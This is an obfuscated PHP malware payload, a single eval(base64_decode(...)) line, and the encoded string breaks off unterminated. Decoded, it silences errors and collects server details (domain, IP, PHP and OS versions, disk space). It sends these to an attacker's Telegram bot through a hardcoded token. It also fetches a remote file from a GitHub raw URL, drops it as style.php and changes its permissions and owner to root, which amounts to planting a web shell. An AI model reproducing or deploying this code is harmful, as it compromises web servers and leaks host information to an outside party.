eval(base64_decode('CiBnb3RvIHhHWVJCOyBkcFNzVjogJGRhdGEgPSBhcnJheSgiXHg2M1wxNTBcMTQxXDE2NFx4NWZcMTUxXHg2NCIgPT4gJGNoYXRfaWQsICJcMTY0XDE0NVwxNzBcMTY0IiA9PiAkbWVzc2FnZSk7IGdvdG8gVEJPaHY7IHJWa2hyOiBjdXJsX3NldG9wdF9hcnJheSgkY2gsIGFycmF5KENVUkxPUFRfVVJMID0+ICJceDY4XHg3NFwxNjRcMTYwXHg3M1x4M2FcNTdcNTdcMTQxXDE2MFwxNTFcNTZcMTY0XDE0NVwxNTRcMTQ1XHg2N1wxNjJcMTQxXDE1NVx4MmVceDZmXDE2Mlx4NjdcNTdcMTQyXHg2ZlwxNjR7JHRva2VufVx4MmZcMTYzXHg2NVx4NmVceDY0XDExNVx4NjVceDczXHg3M1wxNDFceDY3XHg2NSIsIENVUkxPUFRfUE9TVCA9PiB0cnVlLCBDVVJMT1BUX1BPU1RGSUVMRFMgPT4gJGRhdGEsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIgPT4gdHJ1ZSwgQ1VSTE9QVF9USU1FT1VUID0+IDMwMCkpOyBnb3RvIEhpWUowOyBwTjJxYTogJG9zID0gcGhwX3VuYW1lKCJcMTYzIik7IGdvdG8gdkJYdEI7IHZCWHRCOiAkb3NfZnVsbF9pbmZvID0gcGhwX3VuYW1lKCk7IGdvdG8gZlpqa2w7IGo5VGM0OiAkZnJlZV9zcGFjZV9pbl9nYiA9IHJvdW5kKGRpc2tfZnJlZV9zcGFjZSgiXDU3IikgLyAxMDI0IC8gMTAyNCAvIDEwMjQsIDIpOyBnb3RvIHRQR2tZOyBFN3BYajogaWYgKCRhdHRlbXB0ID09IDUpIHsgZWNobyAiXDU2IjsgfSBnb3RvIFNwS3ljOyBWZGk3NDogJGN1cnJlbnRfcGFnZV91cmwgPSAoaXNzZXQoJF9TRVJWRVJbIlwxMTBceDU0XHg1NFx4NTBcMTIzIl0pICYmICRfU0VSVkVSWyJceDQ4XDEyNFwxMjRcMTIwXHg1MyJdID09PSAiXDE1N1x4NmUiID8gIlwxNTBceDc0XHg3NFwxNjBcMTYzIiA6ICJcMTUwXHg3NFwxNjRcMTYwIikgLiAiXDcyXHgyZlw1N3skX1NFUlZFUlsiXHg0OFwxMjRceDU0XDEyMFx4NWZceDQ4XDExN1x4NTNcMTI0Il19eyRfU0VSVkVSWyJcMTIyXHg0NVx4NTFceDU1XHg0NVwxMjNceDU0XHg1ZlwxMjVceDUyXHg0OSJdfSI7IGdvdG8gZnJzbGY7IHJCZWVsOiAkYXR0ZW1wdCA9IDA7IGdvdG8gV1Q0RXU7IGgwcGRoOiBzZXRfdGltZV9saW1pdCgzMDApOyBnb3RvIElvcWxpOyB4R1lSQjogaW5pX3NldCgiXDE0NFx4NjlcMTYzXDE2MFx4NmNcMTQxXDE3MVx4NWZcMTQ1XHg3MlwxNjJceDZmXHg3MlwxNjMiLCAwKTsgZ290byB0b2dIczsgV1Q0RXU6IHdoaWxlICghZmlsZV9leGlzdHMoJGRlc3RpbmF0aW9uKSAmJiAkYXR0ZW1wdCA8IDUpIHsgaWYgKGNvcHkoJHVybCwgJGRlc3RpbmF0aW9uKSkgeyBjaG1vZCgkZGVzdGluYXRpb24sIDQ5Myk7IHJlbmFtZSgiXHg2MVwxNTZceDc0XDE1MVx4MzlcNTZceDc0XDE3MFwxNjQiLCAiXHg3M1wxNjRcMTcxXHg2OVx4NjVceDJlXHg3MFwxNTBcMTYwIik7IGNobW9kKCJcMTYzXDE2NFx4NzlceDY5XHg2NVw1Nlx4NzBcMTUwXHg3MCIsIDI5Mik7IGNob3duKCJceDczXDE2NFwxNzFceDY5XDE0NVw1Nlx4NzBceDY4XDE2MCIsICJcMTYyXDE1N1wxNTdceDc0Iik7IGJyZWFrOyB9IGVsc2UgeyAkYXR0ZW1wdCsrOyBzbGVlcCg1KTsgfSB9IGdvdG8gRTdwWGo7IFBveEltOiAkZGVzdGluYXRpb24gPSAiXDE0MVwxNTZceDc0XDE1MVw3MVx4MmVcMTY0XDE3MFwxNjQiOyBnb3RvIHJCZWVsOyBHMmFmczogY3VybF9jbG9zZSgkY2gpOyBnb3RvIEFiSXZYOyBQZVk3bzogJHBocF92ZXJzaW9uID0gcGhwdmVyc2lvbigpOyBnb3RvIGIzSEd6OyBIaVlKMDogJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7IGdvdG8gbG5QTzA7IFhtXzYxOiAkY2hhdF9pZCA9ICJcNTVceDM5XHgzMFx4MzBceDMyXHgzNFx4MzhceDMyXHgzOVw2NCI7IGdvdG8gVmRpNzQ7IGZyc2xmOiAkZG9tYWluID0gcGFyc2VfdXJsKCRjdXJyZW50X3BhZ2VfdXJsLCBQSFBfVVJMX0hPU1QpOyBnb3RvIFBlWTdvOyBJcnhtZjogaWYgKCRhdHRlbXB0ID09IDUpIHsgZWNobyAiXHgyZSI7IH0gZ290byBsX0ppdzsgZlpqa2w6ICRtZXNzYWdlID0gIlx4NGVcMTAxXDExNVwxMDVceDIwXDEwNFx4NGZcMTE1XDEwMVx4NDlceDRlXHgyMFx4M2FceDIwIiAuIHN0cnRvdXBwZXIoJGRvbWFpbikgLiAiXDQwXHgzYVx4MjBcMTQxXDQwXHg3MFwxNDFceDc0XDE1MFw0MFw3Mlx4MjAiIC4gJGN1cnJlbnRfcGFnZV91cmwgLiAiXHhhXHg1MFx4NDhcMTIwXDQwXHg1NlwxNDVceDcyXDE2M1wxNTFceDZmXHg2ZVx4M2FceDIwIiAuICRwaHBfdmVyc2lvbiAuICJceGFcMTIzXHg2NVx4NzJceDc2XHg2NVwxNjJceDIwXHg1M1wxNTdcMTQ2XDE2NFwxNjdceDYxXDE2Mlx4NjVceDNhXDQwIiAuICRzZXJ2ZXJfc29mdHdhcmUgLiAiXHhhXHg0NlwxNjJcMTQ1XDE0NVx4MjBcMTIzXHg3MFwxNDFcMTQzXHg2NVw3Mlx4MjAiIC4gJGZyZWVfc3BhY2VfaW5fZ2IgLiAiXDQwXDEwN1x4NDIiIC4gIlwxMlwxMjNcMTQ1XDE2Mlx4NzZceDY1XHg3Mlx4MjBcMTIwXDE2MlwxNTdcMTY0XDE1N1x4NjNceDZmXHg2Y1w3Mlw0MCIgLiAkc2VydmVyX3Byb3RvY29sIC4gIlx4YVwxMjNceDY1XHg3MlwxNjZceDY1XDE2Mlw0MFx4NDlceDUwXHgzYVx4MjAiIC4gJHNlcnZlcl9pcCAuICJceGFceDRmXDE2MFwxNDVcMTYyXHg2MVx4NzRcMTUxXDE1Nlx4NjdcNDBceDUzXDE3MVx4NzNcMTY0XDE0NVx4NmRcNzJcNDAiIC4gJG9zIC4gIlx4YVx4NDZceDc1XDE1NFx4NmNcNDBcMTE3XDEyM1x4MjBceDQ5XHg2ZVwxNDZceDZmXHgzYVw0MCIgLiAkb3NfZnVsbF9pbmZvOyBnb3RvIGRwU3NWOyBOSmxKbjogd2hpbGUgKCFmaWxlX2V4aXN0cygkZGVzdGluYXRpb24pICYmICRhdHRlbXB0IDwgNSkgeyBpZiAoY29weSgkdXJsLCAkZGVzdGluYXRpb24pKSB7IGNobW9kKCRkZXN0aW5hdGlvbiwgNDkzKTsgcmVuYW1lKCJceDYxXHg2ZVx4NzRceDY5XHgzOVw1Nlx4NzRcMTcwXDE2NCIsICJcMTYzXHg3NFwxNzFceDY5XHg2NVx4MmVcMTYwXDE1MFwxNjAiKTsgY2htb2QoIlwxNjNceDc0XHg3OVwxNTFcMTQ1XHgyZVx4NzBceDY4XDE2MCIsIDI5Mik7IGNob3duKCJcMTYzXHg3NFx4NzlceDY5XHg2NVx4MmVcMTYwXDE1MFwxNjAiLCAiXHg3Mlx4NmZceDZmXHg3NCIpOyBicmVhazsgfSBlbHNlIHsgJGF0dGVtcHQrKzsgc2xlZXAoNSk7IH0gfSBnb3RvIElyeG1mOyBJb3FsaTogJHRva2VuID0gIlw2Nlw2NFw2M1x4MzJceDMxXDYwXHgzM1x4MzhceDM4XDYyXHgzYVwxMDFcMTAxXDEwNVwxNjJceDQxXDE1NFx4NzhceDUxXHg1YVwxNDZcMTEzXDEyMVw2NVwxMzJcMTA0XHg0M1x4NmRceDRhXHgzNVx4MzFceDU5XHg1NVx4NmRceDc1XHg0Ylx4NDRcNjJceDc1XHg2Zlx4NDNcMTE1XHgyZFwxMjdceDYxXHg1OSI7IGdvdG8gWG1fNjE7IHRvZ0hzOiBpbmlfc2V0KCJceDY0XHg2OVwxNjNceDcwXHg2Y1wxNDFcMTcxXHg1Zlx4NzNcMTY0XDE0MVx4NzJceDc0XHg3NVwxNjBcMTM3XDE0NVx4NzJcMTYyXDE1N1x4NzJceDczIiwgMCk7IGdvdG8gQnlWZ3Q7IGxuUE8wOiBpZiAoJHJlc3BvbnNlID09PSBmYWxzZSkgeyB9IGVsc2UgeyAkaHR0cGNvZGUgPSBjdXJsX2dldGluZm8oJGNoLCBDVVJMSU5GT19IVFRQX0NPREUpOyB9IGdvdG8gRzJhZnM7IFRXWjF4OiAkc2VydmVyX2lwID0gJF9TRVJWRVJbIlwxMjNceDQ1XDEyMlwxMjZceDQ1XHg1Mlx4NWZcMTAxXDEwNFwxMDRcMTIyIl07IGdvdG8gcE4ycWE7IHVtS0ZrOiAkYXR0ZW1wdCA9IDA7IGdvdG8gTkpsSm47IHI0Zm5TOiAkZGVzdGluYXRpb24gPSAiXHg2MVx4NmVceDc0XDE1MVw3MVx4MmVceDc0XHg3OFx4NzQiOyBnb3RvIHVtS0ZrOyBsX0ppdzogJHVybCA9ICJcMTUwXDE2NFwxNjRceDcwXHg3M1w3Mlx4MmZcNTdcMTYyXDE0MVwxNjdcNTZceDY3XHg2OVx4NzRcMTUwXDE2NVx4NjJcMTY1XHg3M1wxNDVcMTYyXHg2M1x4NmZceDZlXHg3NFx4NjVcMTU2XDE2NFw1NlwxNDNceDZmXHg2ZFx4MmZceDYzXHg2Y1wxNDFceDczXHg3M1w1NVx4NzNceDY5XDE3Mlx4NjVceDJmXDE2M1wxNTFcMTcyXHg2NVx4MmZceDZkXDE0MVwxNTFceDZlXHgyZlx4NjFceDZlXHg3NFwxNTFceDM5XHgyZVx4NzRcMTcwXHg3NCI7IGdvdG8gUG94SW07IEFiSXZYOiAkdXJsID0gIlwxNTBcMTY0XDE2NFx4NzBceDczXDcyXHgyZlx4MmZcMTYyXHg2MVx4NzdcNTZcMTQ3XDE1MVx4NzRceDY4XHg3NVx4NjJcMTY1XDE2M1x4NjVceDcyXDE0M1x4NmZceDZlXDE2NFwxNDVceDZlXHg3NFw1Nlx4NjNcMTU3XDE1NVx4MmZcMTQzXHg2Y1x4NjFcMTYzXHg3M1w1NVwxNjNcMTUxXHg3YVx4NjVcNTdcMTYzXDE1MVx4N2FcMTQ1XHgyZlx4NmRceDYxXHg2OVx4NmVcNTdceDYxXHg2ZVx4NzRcMTUxXHgzOVw1NlwxNjRcMTcwXDE2NCI7IGdvdG8gcjRmblM7IEJ5Vmd0OiBlcnJvcl9yZXBvcnRpbmcoMCk7IGdvdG8gaDBwZGg7IHRQR2tZOiAkc2VydmVyX3Byb3RvY29sID0gJF9TRVJWRVJbIlwxMjNceDQ1XHg1Mlx4NTZcMTA1XDEyMlx4NWZceDUwXDEyMlx4NGZceDU0XHg0Zlx4NDNcMTE3XHg0YyJdOyBnb3RvIFRXWjF4OyBiM0hHejogJHNlcnZlcl9zb2Z0d2FyZSA9ICRfU0VSVkVSWyJceDUzXDEwNVx4NTJceDU2XHg0NVx4NTJceDVmXDEyM1wxMTdcMTA2XHg1NFwxMjdceDQxXDEyMlwxMDUiXTsgZ290byBqOVRjNDsgVEJPaHY6ICRjaCA9IGN1cmxfaW5pdCgpOyBnb3RvIHJWa2hyOyBTcEt5Yzog
